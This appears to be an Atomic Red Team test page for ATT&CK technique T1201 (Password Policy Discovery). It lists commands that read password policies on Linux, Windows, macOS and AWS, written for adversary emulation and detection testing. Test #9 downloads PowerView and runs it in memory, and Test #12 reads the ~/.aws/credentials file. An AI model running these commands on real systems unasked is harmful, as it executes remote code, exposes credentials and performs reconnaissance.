---
tags: [T1201, atomic_test]
filename: "[[T1201 - Password Policy Discovery]]"
---
# T1201 - Password Policy Discovery

## Atomic Test #1 - Examine password complexity policy - Ubuntu
Lists the password complexity policy to console on Ubuntu Linux.

**Supported Platforms:** Linux


**auto_generated_guid:** 085fe567-ac84-47c7-ac4c-2688ce28265b






#### Attack Commands: Run with `bash`! 


```bash
cat /etc/pam.d/common-password
```






<br/>
<br/>

## Atomic Test #2 - Examine password complexity policy - FreeBSD
Lists the password complexity policy to console on FreeBSD.

**Supported Platforms:** Linux


**auto_generated_guid:** a7893624-a3d7-4aed-9676-80498f31820f






#### Attack Commands: Run with `sh`! 


```sh
cat /etc/pam.d/passwd
```






<br/>
<br/>

## Atomic Test #3 - Examine password complexity policy - CentOS/RHEL 7.x
Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.

**Supported Platforms:** Linux


**auto_generated_guid:** 78a12e65-efff-4617-bc01-88f17d71315d






#### Attack Commands: Run with `bash`! 


```bash
cat /etc/security/pwquality.conf
```




#### Dependencies:  Run with `bash`!
##### Description: System must be CentOS or RHEL v7
##### Check Prereq Commands:
```bash
if [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq "7" ]; then exit 0; else exit 1; fi;
```
##### Get Prereq Commands:
```bash
echo Please run from CentOS or RHEL v7
```




<br/>
<br/>

## Atomic Test #4 - Examine password complexity policy - CentOS/RHEL 6.x
Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.

**Supported Platforms:** Linux


**auto_generated_guid:** 6ce12552-0adb-4f56-89ff-95ce268f6358






#### Attack Commands: Run with `bash`! 


```bash
cat /etc/pam.d/system-auth
cat /etc/security/pwquality.conf
```




#### Dependencies:  Run with `bash`!
##### Description: System must be CentOS or RHEL v6
##### Check Prereq Commands:
```bash
if [ $(rpm -q --queryformat '%{VERSION}') -eq "6" ]; then exit /b 0; else exit /b 1; fi;
```
##### Get Prereq Commands:
```bash
echo Please run from CentOS or RHEL v6
```




<br/>
<br/>

## Atomic Test #5 - Examine password expiration policy - All Linux
Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.

**Supported Platforms:** Linux


**auto_generated_guid:** 7c86c55c-70fa-4a05-83c9-3aa19b145d1a






#### Attack Commands: Run with `bash`! 


```bash
cat /etc/login.defs
```






<br/>
<br/>

## Atomic Test #6 - Examine local password policy - Windows
Lists the local password policy to console on Windows.

**Supported Platforms:** Windows


**auto_generated_guid:** 4588d243-f24e-4549-b2e3-e627acc089f6






#### Attack Commands: Run with `command_prompt`! 


```cmd
net accounts
```






<br/>
<br/>

## Atomic Test #7 - Examine domain password policy - Windows
Lists the domain password policy to console on Windows.

**Supported Platforms:** Windows


**auto_generated_guid:** 46c2c362-2679-4ef5-aec9-0e958e135be4






#### Attack Commands: Run with `command_prompt`! 


```cmd
net accounts /domain
```






<br/>
<br/>

## Atomic Test #8 - Examine password policy - macOS
Lists the password policy to console on macOS.

**Supported Platforms:** macOS


**auto_generated_guid:** 4b7fa042-9482-45e1-b348-4b756b2a0742






#### Attack Commands: Run with `bash`! 


```bash
pwpolicy getaccountpolicies
```






<br/>
<br/>

## Atomic Test #9 - Get-DomainPolicy with PowerView
Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.

**Supported Platforms:** Windows


**auto_generated_guid:** 3177f4da-3d4b-4592-8bdc-aa23d0b2e843






#### Attack Commands: Run with `powershell`! 


```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose
```






<br/>
<br/>

## Atomic Test #10 - Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy
The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.
Upon successful execution a listing of the policy implemented will display.
Reference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps

**Supported Platforms:** Windows


**auto_generated_guid:** b2698b33-984c-4a1c-93bb-e4ba72a0babb






#### Attack Commands: Run with `powershell`! 


```powershell
get-addefaultdomainpasswordpolicy
```






<br/>
<br/>

## Atomic Test #11 - Use of SecEdit.exe to export the local security policy (including the password policy)
SecEdit.exe can be used to export the current local security policy applied to a host.
[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)

**Supported Platforms:** Windows


**auto_generated_guid:** 510cc97f-56ac-4cd3-a198-d3218c23d889






#### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin) 


```cmd
secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt
```






<br/>
<br/>

## Atomic Test #12 - Examine AWS Password Policy
This atomic test will display details about the password policy for the current AWS account.

**Supported Platforms:** Iaas:aws


**auto_generated_guid:** 15330820-d405-450b-bd08-16b5be5be9f4






#### Attack Commands: Run with `sh`! 


```sh
aws iam get-account-password-policy
```




#### Dependencies:  Run with `sh`!
##### Description: Check if ~/.aws/credentials file has a default stanza is configured
##### Check Prereq Commands:
```sh
cat ~/.aws/credentials | grep "default"
```
##### Get Prereq Commands:
```sh
echo Please install the aws-cli and configure your AWS defult profile using: aws configure
```




<br/>
